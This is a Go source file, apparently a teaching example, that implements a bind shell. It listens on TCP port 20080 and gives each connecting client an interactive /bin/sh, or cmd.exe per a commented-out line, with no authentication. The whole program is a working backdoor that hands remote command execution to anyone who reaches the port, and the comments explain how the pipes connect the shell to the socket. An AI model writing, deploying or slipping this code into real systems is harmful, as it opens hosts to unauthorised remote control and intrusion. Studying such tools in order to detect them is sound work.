package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {

	/*
	 * Explicitly calling /bin/sh and using -i for interactive mode
	 * so that we can use it for stdin and stdout.
	 * For Windows use exec.Command("cmd.exe")
	 */
	// cmd := exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")

	// Create both a reader and writer that are synchronously connected
	// Any data written to the writer (`wp` in this example) will be read by the reader (`rp`)
	rp, wp := io.Pipe()

	// Set stdin to our connection
	cmd.Stdin = conn
	cmd.Stdout = wp      // Assign writer to `cmd.Stdout`
	go io.Copy(conn, rp) // Use `io.Copy(conn, rp)` to link the `PipeReader` to the TCP connection
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
